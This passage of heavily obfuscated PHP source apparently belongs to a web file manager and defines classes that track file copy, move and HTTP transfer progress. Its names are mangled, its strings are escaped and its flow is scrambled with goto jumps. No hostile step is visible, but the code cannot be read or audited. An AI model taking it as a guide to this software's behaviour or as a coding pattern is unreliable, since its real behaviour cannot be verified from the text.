$EØ¦ğ¼Áñï[$eõ¿÷¢‡ç[75]]; $eŒ‰œ“ó = $fŸæˆÍ°™§ . str_replace("\173\x69\157\72{$cªÒ¯¦á¤à}\x7d\57", $eõ¿÷¢‡ç[33], $Eà×¦ÁçäŒ); if (!IO::exist($Eà×¦ÁçäŒ)) { $EêÖÆÉ­Ëõ[] = $EØ¦ğ¼Áñï[$eõ¿÷¢‡ç[441]]; $B‰Ï„Ê°¡Ğ->updateFileEnd($EØ¦ğ¼Áñï[$eõ¿÷¢‡ç[28]], $EØ¦ğ¼Áñï[$eõ¿÷¢‡ç[77]]); continue; } goto EÌÙ¨Çß³Õ; EÌÙ¨Çß³Õ: if (IO::exist($eŒ‰œ“ó)) { $B‰Ï„Ê°¡Ğ->updateFileEnd($EØ¦ğ¼Áñï[$eõ¿÷¢‡ç[28]], $EØ¦ğ¼Áñï[$eõ¿÷¢‡ç[77]]); continue; } if (!IO::move($Eà×¦ÁçäŒ, get_path_father($eŒ‰œ“ó))) { $e¯–ĞÜ‹…È = !1; break; } $F„‹†ƒ‡ßÃ = array($eõ¿÷¢‡ç[441] => $EØ¦ğ¼Áñï[$eõ¿÷¢‡ç[441]]); goto F–›ªë¤¨•; E¥òËäÇù: } $this->removeByFileID($EêÖÆÉ­Ëõ); goto e©öà¡ÃÈä; b¼ğÏ±ŞÙÙ: $fŸæˆÍ°™§ = "\173\151\x6f\72{$d¡¾æèóà‘}\175\x2f"; $e¯–ĞÜ‹…È = !0; $EêÖÆÉ­Ëõ = array(); goto Cê„¹À ¬½; B„è‹èæÁ: $B‰Ï„Ê°¡Ğ->task[$eõ¿÷¢‡ç[720]] = (double) $eÊºåéßòÎ; $Bƒ²°Ú™ö = KodIO::defaultDriver(); $d¡¾æèóà‘ = $Bƒ²°Ú™ö[$eõ¿÷¢‡ç[388]]; goto b¼ğÏ±ŞÙÙ; FÂòßÕˆÈ : $eÊºåéßòÎ = Model($eõ¿÷¢‡ç[444])->where($F„‹†ƒ‡ßÃ)->sum($eõ¿÷¢‡ç[77]); $d°¥¥ĞğÚê = $EÉÍ¿¯Òâ . $eõ¿÷¢‡ç[1983] . $cªÒ¯¦á¤à; $B‰Ï„Ê°¡Ğ = new TaskFileTransfer($d°¥¥ĞğÚê, $eõ¿÷¢‡ç[1978], $Cä‘¾ÔóÜÄ, LNG($eõ¿÷¢‡ç[1984]) . "\x28{$cªÒ¯¦á¤à}\x29"); goto B„è‹èæÁ; bêÍ¿ÁÀ¯¬: } public function progress($d¨öÑ°Ò, $b¸Ä‹µ¦Ò) { return Task::get($b¸Ä‹µ¦Ò . $_SERVER[ÉóçÄÇ][1983] . $d¨öÑ°Ò); } private function removeByFileID($B»‰˜ÖŒİ = array()) { goto A™—Ğ¨‰¸š; fŞù¨—ò: $aé¤••£Ò = Model($BÑ¬¼ÆŠÆ[1186])->where($E•ÑÀÈ…ÈÖ)->field($BÑ¬¼ÆŠÆ[390])->select(); if (!$aé¤••£Ò) { return; } $aé¤••£Ò = array_to_keyvalue($aé¤••£Ò, $BÑ¬¼ÆŠÆ[33], $BÑ¬¼ÆŠÆ[390]); goto fÆŸîñÛêÌ; A™—Ğ¨‰¸š: $BÑ¬¼ÆŠÆ =& $_SERVER[ÉóçÄÇ]; if (empty($B»‰˜ÖŒİ)) { return; } $E•ÑÀÈ…ÈÖ = array($BÑ¬¼ÆŠÆ[441] => array($BÑ¬¼ÆŠÆ[7], $B»‰˜ÖŒİ)); goto fŞù¨—ò; fÆŸîñÛêÌ: foreach ($aé¤••£Ò as $A¦äë¥…ä©) { Model($BÑ¬¼ÆŠÆ[403])->removeNow($A¦äë¥…ä©, !1); } goto eó”ã‡„¾¸; eó”ã‡„¾¸: } private function removeShareItems($A¥¯†Ã’ÖÙ) { goto F°ºé’ˆ¤Œ; eÛ¾‘¾éäÃ: Model($B¥´‹ë¾™É[558])->remove($c°Õƒ•¦¦); goto EöÏ„Óïùô; F°ºé’ˆ¤Œ: $B¥´‹ë¾™É =& $_SERVER[ÉóçÄÇ]; $bÂ”ãã°£ó = "\173\x69\157\x3a{$A¥¯†Ã’ÖÙ}\x7d\x2f"; $F¹ºâ”Šô = array($B¥´‹ë¾™É[390] => 0, $B¥´‹ë¾™É[1053] => array($B¥´‹ë¾™É[378], "{$bÂ”ãã°£ó}\45")); goto eåïó¢¯‹; eåïó¢¯‹: $c»‰°öŸø = Model($B¥´‹ë¾™É[1651])->where($F¹ºâ”Šô)->field($B¥´‹ë¾™É[462])->select(); if (empty($c»‰°öŸø)) { return; } $c°Õƒ•¦¦ = array_to_keyvalue($c»‰°öŸø, $B¥´‹ë¾™É[33], $B¥´‹ë¾™É[462]); goto eÛ¾‘¾éäÃ; EöÏ„Óïùô: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\56\114\x69\x67\150\164\101\x70\x70"; public $modelType = "\123\x79\163\x74\145\x6d\x4f\160\x74\151\157\156"; public $field = array("\x6e\141\155\145", "\147\162\x6f\165\160", "\144\145\163\143", "\143\157\x6e\164\x65\156\164"); public function listData($eÛ‡ø´Š¼ƒ = false, $DÚçƒ˜î®œ = "\155\x6f\x64\151\146\171\124\151\x6d\145", $EŒ·×¢„Í– = true) { return parent::listData($eÛ‡ø´Š¼ƒ, $DÚçƒ˜î®œ, $EŒ·×¢„Í–); } public function remove($a¡‚´‘) { $Eéğ´°¾ = $this->findByName($a¡‚´‘); if (!$Eéğ´°¾) { return !1; } return parent::remove($Eéğ´°¾[$_SERVER[ÉóçÄÇ][388]]); } public function add($BÑîï¸¿ÖÒ) { if ($this->findByName($BÑîï¸¿ÖÒ[$_SERVER[ÉóçÄÇ][28]])) { return !1; } return parent::insert($BÑîï¸¿ÖÒ); } public function update($Aö†œôŠ†, $B²ñã®ÑëÛ) { $C¦¸’õºíà =& $_SERVER[ÉóçÄÇ]; $Dá¼¥Å©Ìî = $this->findByName($Aö†œôŠ†); $A°˜½¹Ãƒ = $this->findByName($B²ñã®ÑëÛ[$C¦¸’õºíà[28]]); if (!$Dá¼¥Å©Ìî || $A°˜½¹Ãƒ && $A°˜½¹Ãƒ[$C¦¸’õºíà[388]] != $Dá¼¥Å©Ìî[$C¦¸’õºíà[388]]) { return !1; } return parent::update($Dá¼¥Å©Ìî[$C¦¸’õºíà[388]], $B²ñã®ÑëÛ); } } goto Eæ„•áÎ×ò; EÇ‹ ìÒÌÂ: class TaskFileTransfer extends Task { protected function startAfter() { goto aê¢µÄ…¶Ñ; Dô±Ç•´¨¤: Hook::bind($f‡õ‡Òéß[561], array($this, $f‡õ‡Òéß[1539])); Hook::bind($f‡õ‡Òéß[562], array($this, $f‡õ‡Òéß[1540])); Hook::bind($f‡õ‡Òéß[564], array($this, $f‡õ‡Òéß[1541])); goto Aµ×˜ì‘ê; FÉœ£®Ç¨: Hook::bind($f‡õ‡Òéß[1546], array($this, $f‡õ‡Òéß[1547])); Hook::bind($f‡õ‡Òéß[1548], array($this, $f‡õ‡Òéß[1549])); Hook::bind($f‡õ‡Òéß[1550], array($this, $f‡õ‡Òéß[1551])); goto e¾Ù¸ØÙí¿; dÏ¶õ¾Û¦î: Hook::bind($f‡õ‡Òéß[534], array($this, $f‡õ‡Òéß[1542])); Hook::bind($f‡õ‡Òéß[536], array($this, $f‡õ‡Òéß[1542])); Hook::bind($f‡õ‡Òéß[538], array($this, $f‡õ‡Òéß[1542])); goto E¦íÖæ¹ÚÚ; e¾Ù¸ØÙí¿: $F­Åööœ©‚[$f‡õ‡Òéß[1552]] = LNG($f‡õ‡Òéß[1553]); $F­Åööœ©‚[$f‡õ‡Òéß[1554]] = 0; $F­Åööœ©‚[$f‡õ‡Òéß[1555]] = 0; goto CœÑ¢®ôÍ’; eòŒ‘Ç²•: $F­Åööœ©‚[$f‡õ‡Òéß[1558]] = 0; $F­Åööœ©‚[$f‡õ‡Òéß[1559]] = 0; if (!$F­Åööœ©‚[$f‡õ‡Òéß[1414]]) { $F­Åööœ©‚[$f‡õ‡Òéß[1414]] = LNG($f‡õ‡Òéß[1560]); } goto B äÆÃ‘¢¡; Aµ×˜ì‘ê: Hook::bind($f‡õ‡Òéß[565], array($this, $f‡õ‡Òéß[1541])); Hook::bind($f‡õ‡Òéß[532], array($this, $f‡õ‡Òéß[1542])); Hook::bind($f‡õ‡Òéß[529], array($this, $f‡õ‡Òéß[1542])); goto dÏ¶õ¾Û¦î; E¦íÖæ¹ÚÚ: Hook::bind($f‡õ‡Òéß[1543], array($this, $f‡õ‡Òéß[1544])); Hook::bind($f‡õ‡Òéß[554], array($this, $f‡õ‡Òéß[1545])); $this->sourceModelCopyFlag = !1; goto FÉœ£®Ç¨; aê¢µÄ…¶Ñ: $f‡õ‡Òéß =& $_SERVER[ÉóçÄÇ]; $F­Åööœ©‚ =& $this->task; $this->sourceCopyFolder = !1; goto BºùÁ÷ÀĞ ; CœÑ¢®ôÍ’: $F­Åööœ©‚[$f‡õ‡Òéß[1006]] = $f‡õ‡Òéß[33]; $F­Åööœ©‚[$f‡õ‡Òéß[1556]] = $f‡õ‡Òéß[33]; $F­Åööœ©‚[$f‡õ‡Òéß[1557]] = 0; goto eòŒ‘Ç²•; BºùÁ÷ÀĞ : Hook::bind($f‡õ‡Òéß[1534], array($this, $f‡õ‡Òéß[1535])); Hook::bind($f‡õ‡Òéß[1091], array($this, $f‡õ‡Òéß[1536])); Hook::bind($f‡õ‡Òéß[1537], array($this, $f‡õ‡Òéß[1538])); goto Dô±Ç•´¨¤; B äÆÃ‘¢¡: } protected function endAfter() { goto Aøä¾ë¨ì¶; B®ööïî»: Hook::unbind($EÇÓšù‡Í‰[1537], array($this, $EÇÓšù‡Í‰[1538])); Hook::unbind($EÇÓšù‡Í‰[561], array($this, $EÇÓšù‡Í‰[1539])); Hook::unbind($EÇÓšù‡Í‰[562], array($this, $EÇÓšù‡Í‰[1540])); goto A·äé”µœï; BƒÒ©ì„íÂ: Hook::unbind($EÇÓšù‡Í‰[529], array($this, $EÇÓšù‡Í‰[1542])); Hook::unbind($EÇÓšù‡Í‰[534], array($this, $EÇÓšù‡Í‰[1542])); Hook::unbind($EÇÓšù‡Í‰[536], array($this, $EÇÓšù‡Í‰[1542])); goto D«–§±£¸Æ; Aøä¾ë¨ì¶: $EÇÓšù‡Í‰ =& $_SERVER[ÉóçÄÇ]; Hook::unbind($EÇÓšù‡Í‰[1534], array($this, $EÇÓšù‡Í‰[1535])); Hook::unbind($EÇÓšù‡Í‰[1091], array($this, $EÇÓšù‡Í‰[1536])); goto B®ööïî»; D«–§±£¸Æ: Hook::unbind($EÇÓšù‡Í‰[538], array($this, $EÇÓšù‡Í‰[1542])); Hook::unbind($EÇÓšù‡Í‰[1543], array($this, $EÇÓšù‡Í‰[1544])); Hook::unbind($EÇÓšù‡Í‰[554], array($this, $EÇÓšù‡Í‰[1545])); goto C¹ÀİÃŠéœ; A·äé”µœï: Hook::unbind($EÇÓšù‡Í‰[564], array($this, $EÇÓšù‡Í‰[1541])); Hook::unbind($EÇÓšù‡Í‰[565], array($this, $EÇÓšù‡Í‰[1541])); Hook::unbind($EÇÓšù‡Í‰[532], array($this, $EÇÓšù‡Í‰[1542])); goto BƒÒ©ì„íÂ; C¹ÀİÃŠéœ: Hook::unbind($EÇÓšù‡Í‰[1546], array($this, $EÇÓšù‡Í‰[1547])); Hook::unbind($EÇÓšù‡Í‰[1548], array($this, $EÇÓšù‡Í‰[1549])); Hook::unbind($EÇÓšù‡Í‰[1550], array($this, $EÇÓšù‡Í‰[1551])); goto eõ…íÛåË‹; eõ…íÛåË‹: } public function copyMoveStart($D·¡øÚğŒ», $EÔ·—¶¦, $c÷ğÄßÎ„‚, $bËé½‘ÀÕ) { goto D…íåí²; cø·É•¯²ª: if (substr($EÔ·—¶¦, 0, strlen($aí‘¼¬ŒØ¥)) == $aí‘¼¬ŒØ¥) { return; } if (substr($bËé½‘ÀÕ, 0, strlen($aí‘¼¬ŒØ¥)) == $aí‘¼¬ŒØ¥) { return; } $cãœˆÆÆ‰„ =& $this->task; goto b™”…±¯šÕ; D…íåí²: $f®×‘Î† =& $_SERVER[ÉóçÄÇ]; self::log($f®×‘Î†[1561] . $EÔ·—¶¦ . $f®×‘Î†[66] . $bËé½‘ÀÕ); $aí‘¼¬ŒØ¥ = rtrim(TEMP_FILES, $f®×‘Î†[8]); goto cø·É•¯²ª; b™”…±¯šÕ: $cãœˆÆÆ‰„[$f®×‘Î†[1562]] = KodIO::transferType($D·¡øÚğŒ», $c÷ğÄßÎ„‚); $this->update(); goto eñŸÀŠãÓ; eñŸÀŠãÓ: } public function updateAfter() { goto A‡å†ùª©¥; bÀ’–øÂÇ¿: if ($this->sourceModelCopyFlag) { return; } if ($AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[1562]] == $e„ÑËÓÎƒ[1163]) { return; } if ($AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[1562]] == $e„ÑËÓÎƒ[1076] || $AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[1562]] == $e„ÑËÓÎƒ[106]) { if ($AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[1556]]) { $AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[1559]] = $AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[1558]] + $AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[1555]]; } } else { if ($AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[1562]] == $e„ÑËÓÎƒ[1164]) { if ($AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[1556]] == $e„ÑËÓÎƒ[1076]) { $AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[1559]] = $AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[1558]] + $AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[1555]] * 0.5; } else { if ($AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[1556]] == $e„ÑËÓÎƒ[106]) { $AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[1559]] = $AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[1558]] + $AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[1554]] * 0.5 + $AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[1555]] * 0.5; } } } } goto b‰Äˆ“’õ; b‰Äˆ“’õ: $AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[1512]] = $AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[1559]] / $AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[720]]; if ($AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[1512]] > 0) { $Bˆ±¾Úèî‚ = timeFloat() - $AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[742]] - $AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[1515]]; $AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[1516]] = $Bˆ±¾Úèî‚ * (1 - $AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[1512]]) / $AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[1512]]; } goto DĞóì­‘ ; A‡å†ùª©¥: $e„ÑËÓÎƒ =& $_SERVER[ÉóçÄÇ]; $AÀ¡ÕŒÅ¸ =& $this->task; if (!$AÀ¡ÕŒÅ¸[$e„ÑËÓÎƒ[720]]) { return; } goto bÀ’–øÂÇ¿; DĞóì­‘ : } public function addPath($fó”©æ·½Å) { goto a²Áå¼…¬; Fô‡‰ÄÌœ: $cÒĞÊ¥ƒÅ = IO::infoWithChildren($fó”©æ·½Å); $bŒŠİ› = $DùÁ«²ĞÀ‰[$A¬Ï›³Š¿[1563]] ? $DùÁ«²ĞÀ‰[$A¬Ï›³Š¿[1563]][$A¬Ï›³Š¿[1564]] : 0; $DùÁ«²ĞÀ‰[$A¬Ï›³Š¿[1563]] = array($A¬Ï›³Š¿[1564] => $bŒŠİ› + 1, $A¬Ï›³Š¿[407] => $cÒĞÊ¥ƒÅ[$A¬Ï›³Š¿[28]], $A¬Ï›³Š¿[75] => $cÒĞÊ¥ƒÅ[$A¬Ï›³Š¿[75]], $A¬Ï›³Š¿[489] => $cÒĞÊ¥ƒÅ[$A¬Ï›³Š¿[489]] ? $cÒĞÊ¥ƒÅ[$A¬Ï›³Š¿[489]] : $cÒĞÊ¥ƒÅ[$A¬Ï›³Š¿[75]]); goto cù­’­Õ; a²Áå¼…¬: $A¬Ï›³Š¿ =& $_SERVER[ÉóçÄÇ]; if (!$fó”©æ·½Å) { return; } $DùÁ«²ĞÀ‰ =& $this->task; goto Fô‡‰ÄÌœ; cù­’­Õ: if ($cÒĞÊ¥ƒÅ[$A¬Ï›³Š¿[29]] == $A¬Ï›³Š¿[173]) { $DùÁ«²ĞÀ‰[$A¬Ï›³Š¿[1004]] += 1; } else { $DùÁ«²ĞÀ‰[$A¬Ï›³Š¿[1004]] += $cÒĞÊ¥ƒÅ[$A¬Ï›³Š¿[80]][$A¬Ï›³Š¿[78]]; if ($cÒĞÊ¥ƒÅ[$A¬Ï›³Š¿[390]]) { $DùÁ«²ĞÀ‰[$A¬Ï›³Š¿[1004]] += $cÒĞÊ¥ƒÅ[$A¬Ï›³Š¿[80]][$A¬Ï›³Š¿[79]] + 1; } } $DùÁ«²ĞÀ‰[$A¬Ï›³Š¿[720]] += $cÒĞÊ¥ƒÅ[$A¬Ï›³Š¿[77]]; $this->update(); goto Fª¸ñãĞò®; Fª¸ñãĞò®: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($dó š—çŠË) { $a·–ÙÔå˜ =& $_SERVER[ÉóçÄÇ]; $bœÄè¥µ =& $this->task; $bœÄè¥µ[$a·–ÙÔå˜[1552]] = $dó š—çŠË[$a·–ÙÔå˜[28]]; $bœÄè¥µ[$a·–ÙÔå˜[1006]] = $dó š—çŠË[$a·–ÙÔå˜[28]]; $this->update(); } public function copyFileStart($fäÛ‰…í›‰, $F‚Ëá²ÌãÕ, $E¿ˆ›ÅŒ×, $Fæˆ¬ÊÌöß, $aš¯¿³‘²Ã, $f’íãÌÔ) { goto F¯¿ —åª±; F¯¿ —åª±: $Eè©šì§ªß =& $_SERVER[ÉóçÄÇ]; $C§È’àÙÑ» = $aš¯¿³‘²Ã; if ($C§È’àÙÑ» == $GLOBALS[$Eè©šì§ªß[1565]]) { $C§È’àÙÑ» = $GLOBALS[$Eè©šì§ªß[1566]]; } goto dÅŒ¥¸Àäš; aÎ¶¢ª¸½: $this->update(); goto DïÊËÊâª; dùê•î: $Cä¦ˆ¡”˜ˆ[$Eè©šì§ªß[1006]] = $Eè©šì§ªß[33]; $Cä¦ˆ¡”˜ˆ[$Eè©šì§ªß[1556]] = $Eè©šì§ªß[33]; $Cä¦ˆ¡”˜ˆ[$Eè©šì§ªß[1557]] = 0; goto aÎ¶¢ª¸½; dÅŒ¥¸Àäš: $GLOBALS[$Eè©šì§ªß[1566]] = $aš¯¿³‘²Ã; $GLOBALS[$Eè©šì§ªß[1565]] = $f’íãÌÔ; $Cä¦ˆ¡”˜ˆ =& $this->task; goto c¸¯âƒ“ß¿; c¸¯âƒ“ß¿: $Cä¦ˆ¡”˜ˆ[$Eè©šì§ªß[1552]] = $C§È’àÙÑ»; $Cä¦ˆ¡”˜ˆ[$Eè©šì§ªß[1554]] = (int) $fäÛ‰…í›‰->size($F‚Ëá²ÌãÕ); $Cä¦ˆ¡”˜ˆ[$Eè©šì§ªß[1555]] = 0; goto dùê•î; DïÊËÊâª: } public function copyFileEnd($fÁóÒ°­âÊ, $Eğñ“ï´Œ, $aÍçíì²Ç„, $c´¡ŞÒ‹²¹, $DÌ®‰ùö³à, $Fãô‰ˆÅĞ–) { $AäÒ‘ä‘ö =& $_SERVER[ÉóçÄÇ]; $Bä†»¥²¬ =& $this->task; $Bä†»¥²¬[$AäÒ‘ä‘ö[1555]] = $Bä†»¥²¬[$AäÒ‘ä‘ö[1554]]; $Bä†»¥²¬[$AäÒ‘ä‘ö[1556]] = $AäÒ‘ä‘ö[33]; if ($DÌ®‰ùö³à == $Bä†»¥²¬[$AäÒ‘ä‘ö[1552]]) { $Bä†»¥²¬[$AäÒ‘ä‘ö[1558]] += $Bä†»¥²¬[$AäÒ‘ä‘ö[1554]]; $Bä†»¥²¬[$AäÒ‘ä‘ö[1559]] = $Bä†»¥²¬[$AäÒ‘ä‘ö[1558]]; $this->update(1); } else { $this->update(); $Bä†»¥²¬[$AäÒ‘ä‘ö[1555]] = 0; } self::log($AäÒ‘ä‘ö[1567] . $Eğñ“ï´Œ . $AäÒ‘ä‘ö[66] . $c´¡ŞÒ‹²¹ . $AäÒ‘ä‘ö[227] . $DÌ®‰ùö³à . $AäÒ‘ä‘ö[1568] . $Bä†»¥²¬[$AäÒ‘ä‘ö[1552]]); } public function updateFileEnd($bÙ–½è›ë, $f“öæ¶îí¶) { goto FÍ¾ÈœöÂ; FÍ¾ÈœöÂ: $Bï°ä¼Ÿ =& $_SERVER[ÉóçÄÇ]; $E¿Ù¤ä–ªÛ =& $this->task; $E¿Ù¤ä–ªÛ[$Bï°ä¼Ÿ[1552]] = $bÙ–½è›ë; goto cùÃñ‰Íƒ¾; c˜¥ç‚ŠÀÅ: $this->update(1); self::log($Bï°ä¼Ÿ[1569] . $bÙ–½è›ë); goto a‹æÍùÅØã; cùÃñ‰Íƒ¾: $E¿Ù¤ä–ªÛ[$Bï°ä¼Ÿ[1554]] = $f“öæ¶îí¶; $E¿Ù¤ä–ªÛ[$Bï°ä¼Ÿ[1558]] += $f“öæ¶îí¶; $E¿Ù¤ä–ªÛ[$Bï°ä¼Ÿ[1559]] = $E¿Ù¤ä–ªÛ[$Bï°ä¼Ÿ[1558]]; goto c˜¥ç‚ŠÀÅ; a‹æÍùÅØã: } public function sourceModelCopy($eÙÅ¥½°ÅÛ) { goto a±œæ’â»¦; a±œæ’â»¦: $eÃùÎ ‡á¶ =& $_SERVER[ÉóçÄÇ]; $DØŞÜä = $eÙÅ¥½°ÅÛ[0]; $F­îçª•ã = $eÙÅ¥½°ÅÛ[1]; goto B—šã—Î‡ã; fÃËÁôÍŒ‘: switch ($DØŞÜä) { case $eÃùÎ ‡á¶[530]: $c¬ãºÁÖò¦ = 1; break; case $eÃùÎ ‡á¶[533]: $AÒÂ‰á‡¬[$eÃùÎ ‡á¶[1552]] = $F­îçª•ã[$eÃùÎ ‡á¶[28]]; break; case $eÃùÎ ‡á¶[535]: $c¬ãºÁÖò¦ = intval($eÙÅ¥½°ÅÛ[$eÃùÎ ‡á¶[375]] * 0.4); break; case $eÃùÎ ‡á¶[537]: $c¬ãºÁÖò¦ = intval($eÙÅ¥½°ÅÛ[$eÃùÎ ‡á¶[375]] * 0.2); break; case $eÃùÎ ‡á¶[539]: $c¬ãºÁÖò¦ = intval($eÙÅ¥½°ÅÛ[$eÃùÎ ‡á¶[375]] * 0.4); break; } $this->update($c¬ãºÁÖò¦); $this->sourceModelCopyFlag = !1; goto bÎ‚ôäõœğ; B—šã—Î‡ã: $AÒÂ‰á‡¬ =& $this->task; $this->sourceModelCopyFlag = !0; $c¬ãºÁÖò¦ = 0; goto fÃËÁôÍŒ‘; bÎ‚ôäõœğ: } public function sourceRemove($D•³Â¸Ä², $b²éí¸Î Ò) { $dŠ¹’¡’Ö =& $_SERVER[ÉóçÄÇ]; $this->sourceModelCopyFlag = !0; $FÀÈÅÎˆ—» = 1; if (isset($D•³Â¸Ä²[$dŠ¹’¡’Ö[80]])) { $FÀÈÅÎˆ—» = $D•³Â¸Ä²[$dŠ¹’¡’Ö[80]][$dŠ¹’¡’Ö[78]] + $D•³Â¸Ä²[$dŠ¹’¡’Ö[80]][$dŠ¹’¡’Ö[79]] + 1; } $this->update($FÀÈÅÎˆ—»); $this->sourceModelCopyFlag = !1; } public function sourceMove($d•™ŒŒ»œ‡) { $this->sourceRemove($d•™ŒŒ»œ‡, !1); } public function curlProgress($F…†¨À’„˜, $C¢ÈÁÔ„Úƒ, $ağŒôËË¥‡, $DŞ Åœñ„…, $Aëàó¢×±) { $cŸŒÙÌİ®ã =& $_SERVER[ÉóçÄÇ]; $EÙ•ÅÄ‘· =& $this->task; if ($Aëàó¢×± > 0) { $EÙ•ÅÄ‘·[$cŸŒÙÌİ®ã[1006]] = $cŸŒÙÌİ®ã[1570]; $EÙ•ÅÄ‘·[$cŸŒÙÌİ®ã[1556]] = $cŸŒÙÌİ®ã[106]; if ($EÙ•ÅÄ‘·[$cŸŒÙÌİ®ã[1554]]) { $EÙ•ÅÄ‘·[$cŸŒÙÌİ®ã[1555]] = $Aëàó¢×±; } if ($EÙ•ÅÄ‘·[$cŸŒÙÌİ®ã[1557]]) { $EÙ•ÅÄ‘·[$cŸŒÙÌİ®ã[1555]] = $Aëàó¢×± + $EÙ•ÅÄ‘·[$cŸŒÙÌİ®ã[1557]]; } } else { if ($ağŒôËË¥‡ > 0) { if ($EÙ•ÅÄ‘·[$cŸŒÙÌİ®ã[1554]] == $C¢ÈÁÔ„Úƒ) { $EÙ•ÅÄ‘·[$cŸŒÙÌİ®ã[1555]] = $ağŒôËË¥‡; $EÙ•ÅÄ‘·[$cŸŒÙÌİ®ã[1006]] = $cŸŒÙÌİ®ã[1571]; $EÙ•ÅÄ‘·[$cŸŒÙÌİ®ã[1556]] = $cŸŒÙÌİ®ã[1076]; } } } $this->update(); } public function curlProgressStart($b›…¢ Óµ) { } public function curlProgressEnd($fÁ³) { goto E†á«—ÒÌ; E·ØÄÒ¤ç : $CŞï«Ö„ãÀ = $F¦èöĞ…Û‹[$E‚Ê¦§¹´[1572]]; if ($CŞï«Ö„ãÀ == -1) { $CŞï«Ö„ãÀ = $F¦èöĞ…Û‹[$E‚Ê¦§¹´[1573]]; } if ($C®áÙ¤¯†[$E‚Ê¦§¹´[1556]] == $E‚Ê¦§¹´[106] && $CŞï«Ö„ãÀ) { $C®áÙ¤¯†[$E‚Ê¦§¹´[1557]] += $CŞï«Ö„ãÀ; } goto aİ÷©ŒÀ»Ä; E†á«—ÒÌ: $E‚Ê¦§¹´ =& $_SERVER[ÉóçÄÇ]; $C®áÙ¤¯† =& $this->task; $F¦èöĞ…Û‹ = curl_getinfo($fÁ³); goto E·ØÄÒ¤ç ; aİ÷©ŒÀ»Ä: $this->update(); goto aöô³Ì Ê†; aöô³Ì Ê†: } } class TaskHttp extends Task { protected function startAfter() { $Bèƒ—ù =& $_SERVER[ÉóçÄÇ]; $C³æ•ñŒÈÇ =& $this->task; $C³æ•ñŒÈÇ[$Bèƒ—ù[1574]] = 1; Hook::bind($Bèƒ—ù[1546], array($this, $Bèƒ—ù[1575])); Hook::bind($Bèƒ—ù[1548], array($this, $Bèƒ—ù[1576])); Hook::bind($Bèƒ—ù[1550], array($this, $Bèƒ—ù[1577])); } protected function endAfter() { $e£œ‡ÓåŒï =& $_SERVER[ÉóçÄÇ]; Hook::unbind($e£œ‡ÓåŒï[1546], array($this, $e£œ‡ÓåŒï[1575])); Hook::unbind($e£œ‡ÓåŒï[1548], array($this, $e£œ‡ÓåŒï[1576])); Hook::unbind($e£œ‡ÓåŒï[1550], array($this, $e£œ‡ÓåŒï[1577])); } public function progressStart($E†ÙŠ¢œğğ) { $aÉˆ¶§îµ =& $_SERVER[ÉóçÄÇ]; $déÂÎ¦ÆŸõ = curl_getinfo($E†ÙŠ¢œğğ); self::log($aÉˆ¶§îµ[1578] . $déÂÎ¦ÆŸõ[$aÉˆ¶§îµ[303]]); self::valueSet($this->task[$aÉˆ¶§îµ[388]], $this->task); } public function progressEnd($f§†Ûİš¦ñ) { $Eâ¬øéÉİ¨ =& $_SERVER[ÉóçÄÇ]; self::log($Eâ¬øéÉİ¨[1579] . $this->task[$Eâ¬øéÉİ¨[388]]); $this->end(); } public function progress($aÁ¬»Û Â‡, $Bµ¶œéªéõ, $Eèå¡ô³ÈÖ, $D‘ï‰óÍ—, $aï¸âø‘Ò¤) { $E§›‚¾ÏŒÄ =& $_SERVER[ÉóçÄÇ]; $c®ã…©° =& $this->task; if ($aï¸âø‘Ò¤ > 0) { $c®ã…©°[$E§›‚¾ÏŒÄ[1004]] = $c®ã…©°[$E§›‚¾ÏŒÄ[1004]] == 0 ? $D‘ï‰óÍ— : $c®ã…©°[$E§›‚¾ÏŒÄ[1004]]; $c®ã…©°[$E§›‚¾ÏŒÄ[1018]] = $aï¸âø‘Ò¤; } else { if ($Eèå¡ô³ÈÖ > 0) { $c®ã…©°[$E§›‚¾ÏŒÄ[1004]] = $c®ã…©°[$E§›‚¾ÏŒÄ[1004]] == 0 ? $Bµ¶œéªéõ : $c®ã…©°[$E§›‚¾ÏŒÄ[1004]]; $c®ã…©°[$E§›‚¾ÏŒÄ[1018]] = $Eèå¡ô³ÈÖ; } } $this->update(); self::log("\160\x72\x6f\147\162\x65\163\x73\x48\164\164\160\72\x64\x6f\167\156\72{$Eèå¡ô³ÈÖ}\57{$Bµ¶œéªéõ}\x3b\x20\165\160\154\157\141\144\x3a{$aï¸âø‘Ò¤}\x2f{$D‘ï‰óÍ—}\73"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\x61\163\x6b\x51\165\x65\x75\x65\x4c\x65\x6e\x67\164\x68"; const QUEUE_DATA = "\x74\141\x73\153\x51\x75\145\x75\x65\x44\x61\x74\141"; public static $listData = false; public static function initTask() { } public static function add($a÷Ó¨ˆ­Î», $B®Œ¸ŠÙîª = array(), $a´‡…Şõçê = '', $Aç¬®»Å´â = '') { $dãƒœ³íì† =& $_SERVER[ÉóçÄÇ]; if (self::$listData === !1) { self::$listData = 